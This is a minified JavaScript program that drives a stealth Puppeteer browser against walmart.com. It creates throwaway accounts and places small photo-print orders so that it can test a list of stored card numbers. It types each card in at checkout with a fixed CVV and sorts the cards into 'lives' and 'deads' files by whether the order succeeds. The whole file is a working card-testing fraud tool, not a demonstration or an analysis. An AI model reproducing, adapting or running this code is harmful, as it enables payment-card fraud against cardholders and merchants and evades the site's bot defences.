var c=(t,e)=>()=>(e||t((e={exports:{}}).exports,e),e.exports);var g=c((fi,T)=>{var ht=require("fs"),mt=new Promise((t,e)=>{ht.readFile("./db/deads.txt","utf8",(o,i)=>{o&&e(o),t(i.split(`
`).filter(r=>r.length>0))})});T.exports={deads:mt}});var C=c((bi,q)=>{var ft=require("fs"),bt=new Promise((t,e)=>{ft.readFile("./db/lives.txt","utf8",(o,i)=>(o&&e(o),t(i.split(`
`).filter(r=>r.length>0))))});q.exports={lives:bt}});var _=c((pi,S)=>{var pt=require("fs"),Ft=new Promise((t,e)=>{pt.readFile("./db/tarjetas.txt","utf8",(o,i)=>{o&&e(o),i=i.split(`
`).filter(n=>n.length>0);let r=i.filter(n=>n.includes("|")),d=i.filter(n=>n.includes("|")==!1).map(n=>`${n}${r}`);t(d)})});S.exports={tarjetas:Ft}});var h=c((Fi,$)=>{var{deads:xt}=g(),{lives:yt}=C(),{tarjetas:kt}=_();$.exports={deads:xt,lives:yt,tarjetas:kt}});var O=c((xi,N)=>{var{tarjetas:Tt}=h(),P=[],m=[],D=[],j=[];Tt.then(t=>{for(var e of t)m.includes(e)==!1&&m.push(e);for(var o of m){var i=o.split("|")[0],r=o.split("|")[1],a=parseInt(o.split("|")[2]);P.push(i),D.push(r),j.push(a)}});N.exports={cards:P,fechaMes:D,fechaA\u00F1o:j}});var G=c((ki,A)=>{var gt=require("fs"),yi=require("colors"),{deads:qt}=h(),Ct=async t=>{if((await qt).filter(i=>i==t).length>0)return console.log(`${t.yellow} este ${"dead".red} ya existe en db/deads.txt`);gt.appendFile("./db/deads.txt",t+`
`,{encoding:"utf-8"},i=>{if(i)throw i;return console.log(`${t.red}`)})};A.exports={agregarDeads:Ct}});var X=c((Ti,M)=>{var z=require("fs"),St=t=>{z.readFile("./db/tarjetas.txt","utf8",(e,o)=>{let i=o.split(`
`).filter(d=>d.length>0),r=i.filter(d=>d!=t);if(i.length===r.length)return console.log("se ha colocado una tarjeta invalida");let a=r.join(`
`);z.writeFile("./db/tarjetas.txt",a,d=>{if(d)throw d})})};M.exports={barridoTarjetas:St}});var R=c((qi,L)=>{var _t=require("fs"),gi=require("colors"),{lives:$t}=h(),Pt=async t=>{let e=t.split("|")[0];await $t.then(o=>{if(console.log(o),o.filter(r=>r===t).length>0)return console.log(`${t.yellow} este live ya existe en db/live.txt`);_t.appendFile("./db/lives.txt",t+`
`,{encoding:"utf-8"},r=>{if(r)throw r;return console.log(`${e.green}`)})})};L.exports={agregarLive:Pt}});var E=c((Ci,B)=>{var Dt=(t,e)=>{(!e||e<1)&&(e=t.length);for(let o=0;o<e;++o){let i=Math.floor(Math.random()*t.length),r=Math.floor(Math.random()*t.length),a=t[i];t[i]=t[r],t[r]=a}};B.exports={disorder:Dt}});var Z=c((Si,U)=>{var{disorder:jt}=E(),{faker:f}=require("@faker-js/faker"),Nt=require("fs"),Ot=async({page:t,productoPersonalizado:e})=>{console.log("no tienes cuenta creada, se procedera a crear una".yellow);let o="https://www.walmart.com/account/?action=Create&rm=true",i=f.internet.password(10,!0,/[A-Z][0-9][a-z]/,"@Hookom119"),r=["a","b","c","d","e","f","g","h","i","1","2","6","3","z","h","1","9","0","o","p","Z","i","1","2","6","3","z","h","1","9","0","o","p","Z"];jt(r),r=r.toString().replaceAll(",","")+"@gmail.com",await t.goto("https://www.walmart.com/account/signup?vid=oaoh"),await t.waitForSelector("#sign-in-form > div > div > input"),await t.type("#sign-in-form > div > div > input",r),await t.click("#sign-in-form > button"),await t.waitForNavigation(),await t.waitForSelector("#sign-up-form > div:nth-child(2) > div > input"),await t.waitForTimeout(1e3),await t.type("#sign-up-form > div:nth-child(2) > div > input",f.name.firstName()),await t.type("#sign-up-form > div:nth-child(4) > div > input",f.name.lastName()),await t.type("#sign-up-form > div:nth-child(7) > div > div > input",i),await t.click("#sign-up-form > button"),await t.waitForNavigation(),await t.waitForTimeout(1e3),await t.$("div > button > svg")&&await t.click("div > button > svg"),await t.waitForTimeout(1e3),o==="https://www.walmart.com/account/?action=Create&rm=true"&&console.log("Cuenta creada correctamente".green),await t.goto(e||"https://www.walmart.com/ip/seort/10448549"),await t.waitForSelector(".dib > button"),await t.waitForTimeout(3e3),await t.click(".dib > button"),await t.waitForTimeout(3e3),await t.goto("https://www.walmart.com/cart"),await t.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForTimeout(6e3),await t.$("div > div > section > div > div:nth-child(4) > div")&&(await t.click("div > div > section > div > div:nth-child(4) > div"),await t.waitForTimeout(1e3),await t.waitForSelector("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input"),await t.type("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input","10001"),await t.waitForSelector("div.pa0.ma0 > div:nth-child(1) > label"),await t.click("div.pa0.ma0 > div:nth-child(1) > label"),await t.waitForTimeout(1e3),await t.waitForSelector("div.w-100.pa4.bt.b--near-white > button"),await t.click("div.w-100.pa4.bt.b--near-white > button"),await t.waitForTimeout(1e3),await t.waitForSelector("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.click("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.waitForNavigation(),console.log("producto agregado al carrito".green)),await t.waitForSelector("#totalSummary");let n=!0;do{let u=await page2.mainFrame().url();await t.waitForTimeout(1e3),u.search("checkout")!=-1&&(Nt.writeFile("./db/carritoUrl.txt",url,"utf8",s=>{if(s)throw s;console.log("carrito extraido con \xE9xito".green)}),n=!1)}while(n)};U.exports={login:Ot}});var b=c((_i,H)=>{var{login:At}=Z(),Gt=require("fs"),zt=async({page:t,productoPersonalizado:e})=>{let o="#__next > div:nth-child(1) > div > span > header > div:nth-child(7) > a";return console.log("iniciando scrapper..."),await t.goto("https://www.walmart.com"),await t.waitForSelector(o),(await t.$eval(o,r=>r.href)).includes("https://www.walmart.com/account/login?vid=oaoh")===!0?(await At({page:t,productoPersonalizado:e}),Gt.readFileSync("./db/carritoUrl.txt","utf-8")):console.log("Ya existe un usuario".yellow)};H.exports={verifyLogin:zt}});var p=c(($i,V)=>{var Mt=async({page:t})=>{let e='button[data-automation-id="fulfillment-continue"]';await t.waitForTimeout(1e3);let o=await t.$(e),i=await t.mainFrame().url();if(i.search("fulfillment")!=-1&&await t.waitForSelector(e),o&&i.search("fulfillment")!=-1){await t.click(e),await t.waitForNavigation();let r=await t.mainFrame().url()}};V.exports={stepOneFullFillMentPhoto:Mt}});var F=c((Pi,W)=>{var Xt=async({page:t})=>{let e='button[data-automation-id="address-book-action-buttons-on-continue"]',o="#firstName",i="#lastName",r="#phone",a="#addressLineOne",d="div:nth-child(6) > div > button.button.button--link > span",n=!0;await t.waitForTimeout(1e3);let u=await t.$(o),s=await t.mainFrame().url();if(s.search("shipping-address")!=-1&&await t.waitForSelector(o),await t.waitForTimeout(1e3),u&&s.search("shipping-address")!=-1){o&&(await t.waitForSelector(o),await t.type(o,"John"),await t.type(i,"Lenon"),await t.type(r,"2121523478"),await t.type(a,"Calle buena"),await t.waitForTimeout(200),await t.click(e),await t.waitForSelector(d),await t.waitForTimeout(1e3),await t.click(d),await t.waitForSelector('[data-automation-id="address-tile-1"]'),await t.waitForTimeout(1e3)),await t.waitForSelector(e),await t.waitForTimeout(1e3),await t.click(e);do await t.waitForTimeout(1e3),n=await t.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(n)}};W.exports={stepTwoFullFillMentPhoto:Xt}});var I=c((Di,Y)=>{var{stepOneFullFillMentPhoto:Lt}=p(),{stepTwoFullFillMentPhoto:Rt}=F(),Bt=async({page:t})=>{let e="#dropArea > div.device > label",o="button.btn.btn-primary.btn-md-long.action.mb-0.font-weight-bold[disabled]",i='a[class="btn btn-primary btn-add-to-cart disabled"]',r="#zip-code-popover > div > div > input";await t.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#"),await t.waitForSelector(e),await t.waitForTimeout(1e3);let[a]=await Promise.all([t.waitForFileChooser(),t.click(e)]);await a.accept(["./assets/logo.png"]);let d=!0;do await t.waitForTimeout(1e3),d=await t.$(o);while(d);await t.waitForTimeout(1500),await t.click('button[aria-label="Add photos"]'),d=!0;do await t.waitForTimeout(1e3),d=await t.$(i);while(d);await t.click('a[class="btn btn-primary btn-add-to-cart"]'),await t.waitForSelector("#popover-anchor"),await t.waitForTimeout(1e3),await t.click("#popover-anchor"),await t.waitForSelector(r),await t.click(r),await t.click(r),await t.type(r,"10001"),await t.waitForTimeout(1e3),await t.click("#zip-code-popover > div > button.btn.btn-primary"),await t.waitForTimeout(1e3),await t.click("a.checkout-button.btn.btn-primary.btn-lg.btn-block"),await t.waitForNavigation(),await Lt({page:t}),await Rt({page:t})};Y.exports={fotoAuto:Bt}});var tt=c((ji,K)=>{var Q=require("puppeteer-extra"),{cards:l,fechaMes:x,fechaA\u00F1o:y}=O(),Et=require("puppeteer-extra-plugin-stealth"),{agregarDeads:Ut}=G(),{barridoTarjetas:J}=X(),{agregarLive:Zt}=R(),Ht=require("fs"),{verifyLogin:Vt}=b(),{fotoAuto:Wt}=I(),{stepOneFullFillMentPhoto:Yt}=p(),{stepTwoFullFillMentPhoto:It}=F();Q.use(Et());var Jt=async({productoPersonalizado:t})=>{let e=Ht.readFileSync("./db/carritoUrl.txt","utf-8"),o=0;countl=0,contador=1;let i,r=await Q.launch({headless:!1,defaultViewport:null,ignoreHTTPSErrors:!0,userDataDir:"./userData",executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),a=(await r.pages())[0];a.setDefaultTimeout(0),a.setDefaultNavigationTimeout(0);let d=await Vt({page:a});d&&(await a.waitForTimeout(2e3),e=d),await a.goto("https://www.walmart.com/checkout/photo#/payment");for(var n=0;n<=l.length;++n){let s=!0,v=!0;await a.waitForTimeout(3e3),await a.$('div[data-modal-message-descriptor="PhotoPCExpiredMessage"]')&&await Wt({page:a}),await Yt({page:a}),await It({page:a});do{await a.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button")&&(await a.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button"),await a.waitForTimeout(2500),v=!1),await a.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span")&&(await a.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await a.waitForTimeout(1e3),await a.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await a.waitForTimeout(1e3),await a.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await a.waitForTimeout(1e3),await a.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await a.waitForSelector("#firstName"),v=!1);let vt=await a.$("#firstName");await a.waitForTimeout(2e3),vt&&(await a.type("#creditCard",`${l[n]}`),await a.type("#month-chooser",`${x[n]}`),await a.type("#year-chooser",`${y[n]}`),await a.type("#cvv","065"),await a.waitForTimeout(1e3),await a.click("div > form > div.edit-form-actions > div > button"),await a.waitForTimeout(2e3),v=!1)}while(v);do await a.waitForTimeout(1e3),s=await a.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(s);if(console.log(contador," ",l[n]),o==0&&(i=await r.newPage(),i.setDefaultTimeout(0),i.setDefaultNavigationTimeout(0)),await i.bringToFront(),await i.waitForTimeout(2e3),await i.goto(e),await i.waitForSelector("#cvv-field"),await i.$("#cvv-field")){await i.type("#cvv-field","123"),await a.waitForTimeout(1e3),await i.click("#mobile-sticky-footer > div > section > button"),await i.waitForTimeout(7e3);let ut=await i.$("body > div:nth-child(18) > div > div.w_HB > div.w_GY.w_GZ > div > div.w_Gh > div > div > div.w_Q.w_U.mb1");t:var u=i.mainFrame().url();u.search("thankyou")!=-1&&(countl++,console.log("lives del lote",countl),await Zt(`${l[n]}|${x[n]}|${y[n]}`),J(`${l[n]}`),await i.goto(t||"https://www.walmart.com/ip/seort/10448549"),await i.waitForSelector(".dib > button"),await i.waitForTimeout(3e3),await i.click(".dib > button"),await i.waitForTimeout(3e3),await i.goto("https://www.walmart.com/cart"),await i.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await i.click(".flex .sticky .shadow-1 div .ph3  button"),await i.waitForTimeout(7e3)),u.search("thankyou")==-1&&(await Ut(`${l[n]}|${x[n]}|${y[n]}`),J(`${l[n]}`)),i&&(o=1),await a.bringToFront(),contador++}}await r.close()};K.exports={foto:Jt}});var et=c((Ni,ot)=>{var it=require("puppeteer-extra"),Qt=require("puppeteer-extra-plugin-stealth"),{verifyLogin:Kt}=b();it.use(Qt());var ti=async({productoPersonalizado:t})=>{let e=await it.launch({headless:!1,defaultViewport:null,executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),o=(await e.pages())[0];return await o.setDefaultTimeout(0),await o.setDefaultNavigationTimeout(0),await Kt({page:o,productoPersonalizado:t}),await e.close()};ot.exports={loginAuto:ti}});var nt=c((Oi,rt)=>{var at=require("puppeteer-extra"),ii=require("puppeteer-extra-plugin-stealth");at.use(ii());var oi=async({tipo:t})=>{let o=(await(await at.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]})).pages())[0];await o.setDefaultTimeout(0),await o.bringToFront(),t=="manual-login"&&await o.goto("https://www.walmart.com/account/login"),t=="manual-foto"&&await o.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#")};rt.exports={manual:oi}});var ct=c((Ai,dt)=>{var{foto:ei}=tt(),{loginAuto:ai}=et(),{manual:ri}=nt(),ni=async({tipo:t,productoPersonalizado:e})=>{t==="foto"&&ei({productoPersonalizado:e}),t==="login"&&ai({productoPersonalizado:e}),(t==="manual-login"||t==="manual-foto")&&ri({tipo:t})};dt.exports={selectorScrapper:ni}});var wt=c((Gi,lt)=>{var{Router:di}=require("express"),{selectorScrapper:ci}=ct(),st=di();st.post("/",async(t,e)=>{let{tipo:o,productoPersonalizado:i}=t.body;await ci({tipo:o,productoPersonalizado:i}),e.send()});lt.exports=st});var k=require("express"),si=wt(),li=require("detect-port"),w=k(),wi=async()=>(await li().then(t=>{w.set("port",t)}),w.use(k.urlencoded({extended:!1})),w.use(k.json()),w.use(si),w.listen(w.get("port")),w.get("port"));module.exports={server:wi};
